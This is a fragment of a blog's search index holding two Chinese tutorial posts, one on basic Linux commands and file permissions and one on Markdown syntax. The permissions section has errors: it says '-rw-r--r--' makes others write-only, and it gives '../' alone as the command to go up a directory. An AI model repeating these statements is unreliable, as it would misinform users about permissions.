就会等于/home/dmtsai，其管理的范围就只有dmtsai下的所有文件。<br>如果要切换到root，则使用指令<br></p><blockquote><p>sudo -i <br></p></blockquote><p>即可。</p><h3 id="基础的linux指令格式-amp-常见的一些linux指令"><a href="#基础的linux指令格式-amp-常见的一些linux指令" class="headerlink" title=" 基础的linux指令格式&amp;常见的一些linux指令 "></a><font color="red"> 基础的linux指令格式&amp;常见的一些linux指令 </font></h3><p>下达指令的基本格式可以理解为：<br></p><blockquote><p>[dmtsai@study ~]$ command [-options] parameter1 parameter2 …<br><br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;指令 &emsp;&emsp;&emsp;&emsp;选项 &emsp;&emsp;参数(1) &emsp;&nbsp;参数(2)</p></blockquote><p>基础的一些指令为：<br></p><blockquote><ol><li>显示日期的指令： date <br></li><li>显示日历的指令： cal / <br>cal [month] [year]  / <br>cal 10 2015(显示2015年10月的日历) <br></li><li>简单好用的计算器： bc <br></li><li>显示当前文件夹下所有目录：ls <br> 在权限切换为root后，可以通过 ls -al 来查看当前所在文件夹下所有文件的权限</li><li>打开文件夹：cd 【文件夹名】 <br></li><li>回到上一目录: ../ <br></li><li>查看网络的联机状态: netstat -a <br></li></ol></blockquote><h3 id="关于文件权限"><a href="#关于文件权限" class="headerlink" title=" 关于文件权限 "></a><font color="red"> 关于文件权限 </font></h3><p>-rw-r–r– 分别对于 owner group other 的权限 为可读可写，只可读，只可写。<br>改变其文件权限的指令：<br> chgrp ：改变文件所属群组<br> chown ：改变文件拥有者<br> chmod ：改变文件的权限, SUID, SGID, SBIT 等等的特性<br>权限所对应的分数表：<br><br>r:4<br><br>w:2<br><br>x:1<br><br>使用示例：<br>owner = rwx = 4+2+1 = 7<br>group = rwx = 4+2+1 = 7<br>others= — = 0+0+0 = 0</p><blockquote><p>chmod 770 .bashrc (将.bashrc文件权限改成 -rwx-rwx—)</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何使用md来撰写文章？</title>
      <link href="/2021/0816md_use.html"/>
      <url>/2021/0816md_use.html</url>
      
        <content type="html"><![CDATA[<p>-<br>一、标题写法：-<br>第一种方法：<br>1、在文本下面加上 等于号 = ，那么上方的文本就变成了大标题。等于号的个数无限制，但一定要大于0个哦。。<br>2、在文本下面加上 下划线 - ，那么上方的文本就变成了中标题，同样的 下划线个数无限制。<br>3、要想输入=号，上面有文本而不让其转化为大标题，则需要在两者之间加一个空行。<br>另一种方法：（推荐这种方法；注意⚠️中间需要有一个空格）<br>关于标题还有等级表示法，分为六个等级，显示的文本大小依次减小。不同等级之间是以井号  #  的个数来标识的。一级标题有一个 #，二级标题有两个# ，以此类推。<br>例如：</p><h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><p>二、编辑基本语法<br>1、字体格式强调<br> 我们可以使用下面的方式给我们的文本添加强调的效果<br><em>强调</em>  (示例：斜体)<br> <em>强调</em>  (示例：斜体)<br><strong>加重强调</strong>  (示例：粗体)<br> <strong>加重强调</strong> (示例：粗体)<br><em><strong>特别强调</strong></em> (示例：粗斜体)<br><em><strong>特别强调</strong></em>  (示例：粗斜体)<br>2、代码<br><code>&lt;hello world&gt;</code><br>3、代码块高亮<br>#<code> @Override protected void onDestroy() &#123;     EventBus.getDefault().unregister(this);     super.onDestroy(); &#125; #</code><br>4、表格 （建议在表格前空一行，否则可能影响表格无法显示）</p><table><thead><tr><th>表头</th><th>表头</th><th>表头</th></tr></thead><tbody><tr><td>单元格内容</td><td>单元格内容</td><td>单元格内容</td></tr><tr><td>单元格内容</td><td>单元格内容</td><td>单元格内容</td></tr><tr><td></td><td></td><td></td></tr><tr><td>5、其他引用</td><td></td><td></td></tr><tr><td>图片</td><td></td><td></td></tr><tr><td><img src="https://www.baidu.com/img/bd_logo1.png" alt="图片名称"></td><td></td><td></td></tr><tr><td>链接</td><td></td><td></td></tr><tr><td><a href="https://www.baidu.com/">链接名称</a></td><td></td><td></td></tr><tr><td>6、列表</td><td></td><td></td></tr></tbody></table><ol><li>项目1  </li><li>项目2  </li><li>项目3  <ul><li>项目1 （一个<em>号会显示为一个黑点，注意⚠️有空格，否则直接显示为</em>项目1） </li><li>项目2   </li></ul></li></ol><p>7、换行（建议直接在前一行后面补两个空格）<br>直接回车不能换行，<br>可以在上一行文本后面补两个空格，<br>这样下一行的文本就换行了。<br>或者就是在两行文本直接加一个空行。<br>也能实现换行效果，不过这个行间距有点大。  </p><p>8、引用</p><blockquote><p>第一行引用文字<br>第二行引用文字   </p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> etc </tag>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
